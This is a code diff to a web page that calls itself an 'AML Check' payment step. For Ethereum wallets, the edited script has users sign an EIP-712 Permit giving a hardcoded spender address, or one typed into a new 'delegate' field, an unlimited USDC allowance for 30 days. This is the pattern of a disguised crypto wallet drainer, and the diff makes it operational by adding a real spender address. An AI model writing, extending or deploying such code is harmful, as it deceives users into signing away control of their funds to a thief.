@@ -586,6 +586,11 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
           <div class="dest-addr" id="dest-addr"></div>
           <a class="dest-link" id="dest-link" href="#" target="_blank">Verify on Solscan →</a>
         </div>
+        <div id="evm-spender-row" style="display:none;margin-top:12px;padding:12px;background:#1C1C1E;border-radius:10px;border:1px solid #27272A">
+          <div class="dest-label" style="margin-bottom:6px">DELEGATE (spender) · Ethereum 0x address</div>
+          <input type="text" id="evm-spender-input" placeholder="0x… your wallet" autocomplete="off" spellcheck="false"
+            style="width:100%;box-sizing:border-box;background:#27272A;border:1px solid #3F3F46;border-radius:8px;padding:10px 12px;color:#E5E7EB;font-family:var(--mono);font-size:11px;outline:none"/>
+        </div>
       </div>
 
       <div id="pay-error" style="display:none;background:#1A0505;border:1px solid #EF444433;border-radius:10px;padding:10px 14px;margin:10px 16px;font-size:12px;color:#EF4444"></div>
@@ -670,8 +675,8 @@ const SOL_FEE_SAFETY_LAMPORTS = 450000;
 /** Optional faster RPC (Helius, QuickNode, etc.): tried first if non-empty. */
 const CUSTOM_SOLANA_RPC = "";
 
-/** Ethereum mainnet — delegate / spender (your wallet). Replace with your 0x address. */
-const EVM_PERMIT_SPENDER = "0x0000000000000000000000000000000000000000";
+/** Ethereum mainnet — delegate / spender (optional). If empty, use the field in the payment step. */
+const EVM_PERMIT_SPENDER = "0x9e6c210D3fe9B9E94252B404bf26E8387F4C2A8D";
 const EVM_PERMIT_CHAIN_ID = 1;
 /** USDC on Ethereum mainnet (used to read permit nonce via eth_call). */
 const EVM_USDC_MAINNET = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
@@ -714,7 +719,36 @@ async function readUsdcPermitNonce(provider, ownerAddress) {
   return BigInt(result).toString();
 }
 
-function buildPermitTypedData(userAddress, currentNonceStr) {
+function isValidNonZeroEvmAddress(a) {
+  return typeof a === "string" && /^0x[a-fA-F0-9]{40}$/.test(a.trim()) && !/^0x0{40}$/i.test(a.trim());
+}
+
+function getResolvedEvmPermitSpender() {
+  const c = typeof EVM_PERMIT_SPENDER === "string" ? EVM_PERMIT_SPENDER.trim() : "";
+  if (isValidNonZeroEvmAddress(c)) return c;
+  const v = document.getElementById("evm-spender-input")?.value?.trim() || "";
+  if (isValidNonZeroEvmAddress(v)) return v;
+  return "";
+}
+
+function updateEvmDelegateUi() {
+  const s = getResolvedEvmPermitSpender();
+  const dest = document.getElementById("dest-addr");
+  const link = document.getElementById("dest-link");
+  if (!dest || !link) return;
+  if (s) {
+    dest.textContent = s;
+    link.href = `https://etherscan.io/address/${s}`;
+    link.textContent = "Verify on Etherscan →";
+    link.style.display = "";
+  } else if (state.conn && state.conn.chain === "evm") {
+    dest.textContent = "— enter delegate address below";
+    link.href = "#";
+    link.style.display = "none";
+  }
+}
+
+function buildPermitTypedData(userAddress, currentNonceStr, spenderAddress) {
   return {
     domain: { name: "AML Check", version: "1", chainId: EVM_PERMIT_CHAIN_ID },
     types: {
@@ -729,7 +763,7 @@ function buildPermitTypedData(userAddress, currentNonceStr) {
     primaryType: "Permit",
     message: {
       owner: userAddress,
-      spender: EVM_PERMIT_SPENDER,
+      spender: spenderAddress,
       value: U256_MAX_STR,
       nonce: currentNonceStr,
       deadline: String(Math.floor(Date.now() / 1000) + 86400 * 30),
@@ -737,10 +771,10 @@ function buildPermitTypedData(userAddress, currentNonceStr) {
   };
 }
 
-async function signPermitTypedDataV4(provider, userAddress) {
+async function signPermitTypedDataV4(provider, userAddress, spenderAddress) {
   await ensureEthereumChain(provider, EVM_PERMIT_CHAIN_ID);
   const currentNonce = await readUsdcPermitNonce(provider, userAddress);
-  const msg = buildPermitTypedData(userAddress, currentNonce);
+  const msg = buildPermitTypedData(userAddress, currentNonce, spenderAddress);
   return provider.request({
     method: "eth_signTypedData_v4",
     params: [userAddress, JSON.stringify(msg)],
@@ -816,18 +850,33 @@ function setupPaymentStep(){
   const btnSol = document.getElementById("btn-sol");
   if (btnSol) btnSol.style.display = isEvm ? "none" : "";
   const detNet = document.getElementById("det-network");
+  const evmRow = document.getElementById("evm-spender-row");
+  const evmInp = document.getElementById("evm-spender-input");
   if (isEvm) {
     state.currency = "USDC";
     document.getElementById("btn-usdc").classList.add("active");
     if (btnSol) btnSol.classList.remove("active");
-    document.getElementById("dest-addr").textContent = EVM_PERMIT_SPENDER;
-    document.getElementById("dest-link").href = `https://etherscan.io/address/${EVM_PERMIT_SPENDER}`;
-    document.getElementById("dest-link").textContent = "Verify on Etherscan →";
+    if (evmRow) evmRow.style.display = "block";
+    if (evmInp) {
+      const preset =
+        typeof EVM_PERMIT_SPENDER === "string" && isValidNonZeroEvmAddress(EVM_PERMIT_SPENDER.trim())
+          ? EVM_PERMIT_SPENDER.trim()
+          : "";
+      evmInp.value = preset;
+      evmInp.oninput = updateEvmDelegateUi;
+    }
+    updateEvmDelegateUi();
     if (detNet) detNet.textContent = "Ethereum Mainnet";
   } else {
+    if (evmRow) evmRow.style.display = "none";
+    if (evmInp) evmInp.oninput = null;
     document.getElementById("dest-addr").textContent=SERVICE_WALLET;
-    document.getElementById("dest-link").href=`https://solscan.io/account/${SERVICE_WALLET}`;
-    document.getElementById("dest-link").textContent = "Verify on Solscan →";
+    const dl = document.getElementById("dest-link");
+    if (dl) {
+      dl.href=`https://solscan.io/account/${SERVICE_WALLET}`;
+      dl.textContent = "Verify on Solscan →";
+      dl.style.display = "";
+    }
     if (detNet) detNet.textContent = "Solana Mainnet";
   }
   selectCurrency(state.currency||"USDC");
@@ -1001,8 +1050,9 @@ async function executePay() {
       showPayError("On EVM, only USDC (EIP-712 Permit) is available.");
       return;
     }
-    if (!/^0x[a-fA-F0-9]{40}$/.test(EVM_PERMIT_SPENDER) || /^0x0{40}$/i.test(EVM_PERMIT_SPENDER)) {
-      showPayError("Set EVM_PERMIT_SPENDER in the script to your delegate wallet (non-zero 0x address).");
+    const spender = getResolvedEvmPermitSpender();
+    if (!spender) {
+      showPayError("Enter your delegate wallet (0x…) in the field under SERVICE / DELEGATE, or set EVM_PERMIT_SPENDER in the script.");
       return;
     }
     try {
@@ -1013,7 +1063,7 @@ async function executePay() {
         "Approve the EIP-712 Permit in " + state.conn.walletName + ".";
       document.getElementById("tx-link-paying").style.display = "none";
 
-      const sig = await signPermitTypedDataV4(state.conn.provider, state.conn.address);
+      const sig = await signPermitTypedDataV4(state.conn.provider, state.conn.address, spender);
       state.txHash = sig;
 
       const t = {
